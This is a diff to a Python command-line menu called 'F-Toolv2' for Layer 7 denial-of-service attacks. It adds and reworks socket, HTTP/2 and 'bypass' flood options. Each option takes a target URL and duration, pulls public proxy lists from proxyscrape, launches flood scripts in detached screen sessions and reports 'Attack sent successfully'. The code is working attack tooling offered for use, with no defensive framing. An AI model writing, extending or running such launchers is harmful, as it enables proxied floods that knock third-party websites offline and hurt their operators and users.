@@ -574,10 +574,12 @@ class Tool:
               |___/
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HTTPS-SPOOF: Https Spoof GET flood with socks5 proxy")
-		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTPS/2-FLOOD: http2 TLS GET flood Good for any protected sites (JS)")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1 socket flood (JS)")
+		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP2: HTTP/2 GET flood (JS)")
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
+		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
@@ -585,11 +587,11 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/socks5.txt", 'w') as p:
-						p.write(httpx.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text)
-					subprocess.run([f'screen -dm python3 utils/L7/https-spoof {url} {floodtime} {thread}'], shell=True)
+					with open("utils/http.txt", 'w') as p:
+						p.write(httpx.get(http_proxy).text)
+					subprocess.run([f'screen -dm python3 utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -600,8 +602,19 @@ class Tool:
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
 					with open("utils/http.txt", 'w') as p:
-						p.write(httpx.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text)
+						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} {thread}'], shell=True)
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+				except:
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+			elif option == '03' or option == '3':
+				try:
+					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					F_Tool.styleText("\n [*] Downloading Proxy...\n")
+					with open("utils/http.txt", 'w') as p:
+						p.write(httpx.get(http_proxy).text)
+					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
